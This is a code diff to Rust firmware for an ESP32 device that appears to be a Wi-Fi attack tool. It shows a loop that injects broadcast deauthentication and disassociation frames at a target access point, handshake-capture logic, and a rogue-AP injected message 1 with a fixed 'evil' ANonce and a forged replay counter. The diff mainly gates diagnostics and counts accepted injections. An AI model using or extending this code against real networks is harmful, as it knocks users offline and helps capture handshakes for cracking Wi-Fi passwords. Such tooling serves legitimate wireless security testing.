@@ -187,6 +187,11 @@ static WANT_REPLAY: AtomicU32 = AtomicU32::new(0);
 const EVIL_ANONCE: [u8; 32] = [0xA5; 32];
 const INJECT_REPLAY: u32 = 1000; // replay counter for our injected msg1 (> the AP's ~1)
 
+/// Verbose per-tick `[HS]` capture diagnostics on serial. Off for shipping; flip to
+/// `true` to debug a capture (per-second channel/eth/m1/m2 heartbeat + first-EAPOL
+/// frame hexdump). The one-shot "capture on ch" / "rogue AP up" lines stay regardless.
+const HS_DIAG: bool = false;
+
 fn handshake_cb(pkt: esp_radio::wifi::sniffer::PromiscuousPkt<'_>) {
     let d = pkt.data;
     SNIFF_TOTAL.fetch_add(1, Ordering::Relaxed);
@@ -564,11 +569,17 @@ impl Radio {
         let mut sent = 0u32;
         loop {
             for _ in 0..12 {
+                // count only ACCEPTED injections. This IDF v5.5 blob rejects the deauth
+                // subtype (esp_wifi_80211_tx returns InvalidArguments), so `sent` stays 0
+                // on hardware — surfaced honestly on the Done screen + wiki.
                 let n = wifi_frames::deauth(&mut buf, wifi_frames::BROADCAST, bssid, 7);
-                let _ = ifs.sniffer.send_raw_frame(true, &buf[..n], false);
+                if ifs.sniffer.send_raw_frame(true, &buf[..n], true).is_ok() {
+                    sent += 1;
+                }
                 let n2 = wifi_frames::disassoc(&mut buf, wifi_frames::BROADCAST, bssid, 7);
-                let _ = ifs.sniffer.send_raw_frame(true, &buf[..n2], false);
-                sent += 2;
+                if ifs.sniffer.send_raw_frame(true, &buf[..n2], true).is_ok() {
+                    sent += 1;
+                }
                 delay.delay_millis(2);
             }
             if !tick(sent) {
@@ -781,8 +792,8 @@ impl Radio {
                 HS_M1.load(Ordering::Relaxed) && HS_M2.load(Ordering::Relaxed)
             };
             let eapol = EAPOL_COUNT.load(Ordering::Relaxed);
-            if got || ticks % 25 == 0 {
-                // ~5 s serial heartbeat so the 2 min window doesn't flood the log.
+            if HS_DIAG && (got || ticks % 25 == 0) {
+                // ~5 s serial heartbeat (diagnostic only) so the window doesn't flood.
                 esp_println::println!(
                     "[HS:{}] ch{} total={} data={} tgt={} eth={} eapol={} m1={} m2={}",
                     mode,
@@ -805,7 +816,7 @@ impl Radio {
         let eapol = EAPOL_COUNT.load(Ordering::Relaxed);
         // diagnostic: dump the first EAPOL-ethertype frame we saw (if any).
         let dl = DBG_LEN.load(Ordering::Relaxed) as usize;
-        if dl > 0 {
+        if HS_DIAG && dl > 0 {
             // SAFETY: cb is quiesced (promiscuous off); single-reader copy.
             let raw = unsafe { *DBG_FRAME.0.get() };
             let mut s = String::new();
